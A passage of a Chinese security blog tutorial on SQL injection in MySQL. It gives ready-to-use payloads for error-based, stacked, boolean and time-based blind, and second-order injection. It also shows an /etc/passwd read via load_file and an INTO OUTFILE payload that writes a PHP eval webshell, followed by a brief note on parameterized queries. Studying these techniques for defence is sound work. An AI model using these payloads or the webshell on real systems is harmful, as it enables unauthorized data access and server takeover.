+<li>floor()  #原理较为复杂,建议研究一下<a target="_blank" rel="noopener" href="https://www.cnblogs.com/sfriend/p/11365999.html">https://www.cnblogs.com/sfriend/p/11365999.html</a><br><code>1&#39; and (select 1 from (select count(*),concat(user(),floor(rand(0)*2))x from information_schema.tables group by x)a) --</code></li>
+<li>extractvalue()<br><code>1&#39; and extractvalue(1,concat(0x7e,(select user()),0x7e)) --</code></li>
+<li>updatexml()<br><code>1&#39; and updatexml(1,concat(0x7e,(select user()),0x7e),1) --</code></li>
+<li>geometrycollection()<br><code>1&#39; and geometrycollection((select * from(select * from(select user())a)b)) --</code></li>
+<li>multipoint()<br><code>1&#39; and  multipoint((select * from(select * from(select user())a)b)) --</code></li>
+<li>polygon()<br><code>1&#39; and polygon((select * from(select * from(select user())a)b)) --</code></li>
+<li>multipolygon()<br><code>1&#39; and  multipolygon((select * from(select * from(select user())a)b)) --</code></li>
+<li>linestring()<br><code>1&#39; and linestring((select * from(select * from(select user())a)b)) --</code></li>
+<li>multilinestring()<br><code>1&#39; and multilinestring((select * from(select * from(select user())a)b)) --</code></li>
+<li>exp()<br><code>1&#39; and exp(~(select * from(select user())a)) --</code></li>
+</ul>
+<hr>
+<p><strong>堆叠注入</strong></p>
+<p>堆叠注入的产生原因是一次执行多条SQL语句。</p>
+<p>堆叠注入的局限性在于并不是每一个环境下都可以执行，可能受到API或者数据库引擎不支持的限制。</p>
+<p>如在PHP中，<code>mysqli_multi_query()</code>函数可以多语句查询SQL。</p>
+<p>在正常应用中出现的可能性较低。</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_45146120/article/details/101037211">https://blog.csdn.net/weixin_45146120/article/details/101037211</a></p>
+<hr>
+<h3 id="3-无回显注入"><a href="#3-无回显注入" class="headerlink" title="3. 无回显注入"></a>3. 无回显注入</h3><blockquote>
+<p>有的时候,服务器端并不会返回查询结果给客户端,这时候就不能直接通过SQL注入获取信息,</p>
+<p>可以考虑通过条件语句判断，根据服务器返回情况进行数据猜解。</p>
+<p>这种注入需要逐个字符地猜解,因此速度较慢。</p>
+</blockquote>
+<p><strong>基于布尔注入</strong></p>
+<p>Bool盲注通常是由于开发者将报错信息屏蔽而导致的，但是网页中真和假有着不同的回显，比如为真时返回access,为假时返回false;或者为真时返回正常页面，为假时跳转到错误页面等。</p>
+<p>构造Payload的思路: </p>
+<ol>
+<li>要获取的目标数据的语句. 如<code>select password from user limit 1</code> ， 又或是函数 <code>user()</code>;</li>
+<li>截取其中的字符, 使用 <code>substr</code> ， <code>left</code> , <code>right</code> 等函数, 如 <code>substr(user(),1,1)</code>;</li>
+<li>进一步处理截取结果: 为了编写脚本方便. 可以将截取结果转换为16进制或ASCLL码对应的数字值,如<code>ascii(substr(user(),1,1))</code></li>
+<li>比较字符  <code>if(ascii(substr(user(),1,1))=96,1,0)</code> 相等则为true 不相等为false</li>
+<li>拼接payload <code>1&#39; and if(ascii(substr(user(),1,1))=96,1,0) -- </code><br><img src="/2021/05/11/web%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E7%AF%87/SQL%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3/hexo\source_posts\web安全漏洞篇\png\img2\image-20210520155335091.png" alt="image-20210520155335091"></li>
+<li>在脚本中最好使用二分法猜解字符</li>
+</ol>
+<p><strong>基于延时注入</strong></p>
+<p>有时候SQL注入不仅没有回显,服务器也不会根据条件返回不同的页面，这时候考虑延时注入。</p>
+<p>延时注入可以使用sleep或者benchmark等函数</p>
+<p>他们的使用类似布尔注入，只需将IF中的返回结果替换即可</p>
+<p>如</p>
+<p><code>1&#39; and if(ascii(substr(user(),1,1))=97,sleep(4),0) -- </code></p>
+<h3 id="4-二次注入"><a href="#4-二次注入" class="headerlink" title="4. 二次注入"></a>4. 二次注入</h3><p>二次注入是通过与数据库服务器进行交互的过程再次进行注入</p>
+<p>如已知管理员用户为admin</p>
+<p>修改密码的SQL语句为 <code>update users set password=&#39;__ &#39; where username =&#39;__ &#39;and password=&#39;__ &#39;;</code></p>
+<p>注册账号 admin’ – -  密码123456</p>
+<p>登录该账号，修改密码 为1111</p>
+<p>提交修改密码执行的语句为 <code>update users set password=&#39;1111&#39; where username =&#39;admin&#39; -- - and password=&#39;123456&#39;;</code></p>
+<p>因为注释的原因实际执行的语句为 <code> update users set password=&#39;1111&#39; where username =&#39;admin&#39;</code></p>
+<h3 id="5-通过SQL注入读写文件"><a href="#5-通过SQL注入读写文件" class="headerlink" title="5. 通过SQL注入读写文件"></a>5. 通过SQL注入读写文件</h3><blockquote>
+<p>关于各种权限</p>
+<p><a target="_blank" rel="noopener" href="https://www.jb51.net/article/65645.htm">https://www.jb51.net/article/65645.htm</a></p>
+</blockquote>
+<p><strong>读文件Payload</strong></p>
+<p><code>1&#39; union select 1,load_file(&quot;/etc/passwd&quot;) -- </code></p>
+<p><img src="/2021/05/11/web%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E7%AF%87/SQL%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3/hexo\source_posts\web安全漏洞篇\png\img2\image-20210520163309519.png" alt="image-20210520163309519"></p>
+<p><strong>写文件Payload</strong></p>
+<p>通过写文件 可以写入一个webshell,前提是能够获得web服务的路径</p>
+<pre><code class="mysql">1&#39; union select 1,&quot;&lt;?php @eval($_GET[x]);?&gt;&quot;,3,4,5 into outfile &#39;C:/Inetpub/wwwroot/cc.php&#39;
+</code></pre>
+<h2 id="防御SQL注入"><a href="#防御SQL注入" class="headerlink" title="防御SQL注入"></a>防御SQL注入</h2><h3 id="1-过滤敏感参数"><a href="#1-过滤敏感参数" class="headerlink" title="1. 过滤敏感参数"></a>1. 过滤敏感参数</h3><ul>
+<li>黑名单</li>
+<li>白名单</li>
+</ul>
+<h3 id="2-使用参数化查询"><a href="#2-使用参数化查询" class="headerlink" title="2. 使用参数化查询"></a>2. 使用参数化查询</h3><h2 id="其他补充"><a href="#其他补充" class="headerlink" title="其他补充"></a>其他补充</h2><h3 id="1-关于字段类型"><a href="#1-关于字段类型" class="headerlink" title="1.关于字段类型"></a>1.关于字段类型</h3><p>在dvwa low测试中</p>
+<p>输入 1 和 1+字符串(如1a , 1aaaaaa) 返回结果相同</p>
+<p>而查询语句为</p>
+<pre><code class="mysql">SELECT first_name, last_name FROM users WHERE user_id = &#39;1&#39;;
+SELECT first_name, last_name FROM users WHERE user_id = &#39;1a&#39;;
+SELECT first_name, last_name FROM users WHERE user_id = &#39;1aaaaaaa&#39;;
+</code></pre>
+<p>查看数据库描述</p>
+<p><img src="/2021/05/11/web%E5%AE%89%E5%85%A8%E6%BC%8F%E6%B4%9E%E7%AF%87/SQL%E6%B3%A8%E5%85%A5%E7%9B%B8%E5%85%B3/hexo\source_posts\web安全漏洞篇\png\img2\image-20210516113943902.png" alt="image-20210516113943902"></p>
+<p>发现 user_id字段的类型为int类型</p>
+<p>Mysql 对于数字类型的值查询 ，如果加了单引号会将其转换为数字类型 具体转换规则 …</p>
+
+      
+       <hr><span style="font-style: italic;color: gray;"> 转载请注明来源，欢迎对文章中的引用来源进行考证，欢迎指出任何有错误或不够清晰的表达。可以在下面评论区评论，也可以邮件至 1944270374@qq.com </span>
+    </div>
+</article>
+
+
+
+
+
+
+
+    
+
+
+
+
+    </div>
+    <div class="copyright">
+        <p class="footer-entry">
+    ©2020-2023 qwrdxer
+</p>
+<p class="footer-entry">Built with <a href="https://hexo.io/" target="_blank">Hexo</a> and <a href="https://github.com/yelog/hexo-theme-3-hexo" target="_blank">3-hexo</a> theme</p>
+
+    </div>
+    <div class="full-toc">
+        <button class="full" data-title="切换全屏 快捷键 s"><span class="min "></span></button>
+<a class="" id="rocket" ></a>
+
+    </div>
+</div>
+
+</body>
+<script src="/js/jquery.pjax.js?v=1.1.0" ></script>
+
+<script src="/js/script.js?v=1.1.0" ></script>
+<script>
+    var img_resize = 'default';
+    function initArticle() {
+        /*渲染对应的表格样式*/
+        
+            $("#post .pjax table").addClass("green_title");
+        
+
+        /*渲染打赏样式*/
+        
+
+        /*高亮代码块行号*/
+        
+
+        /*访问数量*/
+        
+        $.getScript("//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js");
+        
+
+        /*代码高亮，行号对齐*/
+        $('.pre-numbering').css('line-height',$('.has-numbering').css('line-height'));
+
+        
+        
+    }
+
+    /*打赏页面隐藏与展示*/
+    
+
+</script>
+
+<!--加入行号的高亮代码块样式-->
+
+<!--自定义样式设置-->
+<style>
+    
+    
+    .nav {
+        width: 722px;
+    }
+    .nav.fullscreen {
+        margin-left: -722px;
+    }
+    .nav-left {
+        width: 300px;
+    }
+    
+    
+    @media screen and (max-width: 1468px) {
+        .nav {
+            width: 542px;
+        }
+        .nav.fullscreen {
+            margin-left: -542px;
+        }
+        .nav-left {
+            width: 150px;
+        }
+    }
+    
+    
+    @media screen and (max-width: 1024px) {
+        .nav {
+            width: 542px;
+            margin-left: -542px
+        }
+        .nav.fullscreen {
+            margin-left: 0;
+        }
+    }
+    
+    @media screen and (max-width: 426px) {
+        .nav {
+            width: 100%;
+        }
+        .nav-left {
+            width: 100%;
+        }
+    }
+    
+    
+    .nav-right .title-list nav a .post-title, .nav-right .title-list #local-search-result a .post-title {
+        color: #383636;
+    }
+    
+    
+    .nav-right .title-list nav a .post-date, .nav-right .title-list #local-search-result a .post-date {
+        color: #5e5e5f;
+    }
+    
+    
+    .nav-right nav a.hover, #local-search-result a.hover{
+        background-color: #e2e0e0;
+    }
+    
+    
+
+    /*列表样式*/
+    
+
+    /* 背景图样式 */
+    
+    #post {
+        background: url(/img/start.png);
+    }
+    
+    
+
+
+    /*引用块样式*/
+    
+
+    /*文章列表背景图*/
+    
+
+    
+</style>
+
+
+
+
+
+
+
+</html>
